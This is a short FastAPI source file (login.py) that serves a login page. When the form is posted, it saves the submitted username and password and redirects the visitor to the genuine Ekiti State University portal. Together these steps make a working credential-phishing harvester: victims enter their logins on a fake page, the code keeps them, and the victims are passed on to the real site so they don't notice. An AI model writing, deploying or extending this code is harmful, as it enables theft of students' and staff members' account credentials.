#login.py

from fastapi import APIRouter, Form, Request
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse
from app.db.database import save_credentials  # your own DB logic
from fastapi.responses import RedirectResponse

router = APIRouter()
templates = Jinja2Templates(directory="app/templates")

@router.get("/login", response_class=HTMLResponse)
async def show_login(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@router.post("/login")
async def process_login(username: str = Form(...), password: str = Form(...)):
    save_credentials(username, password)
    return RedirectResponse(url="https://eksuportal.eksu.edu.ng", status_code=302)
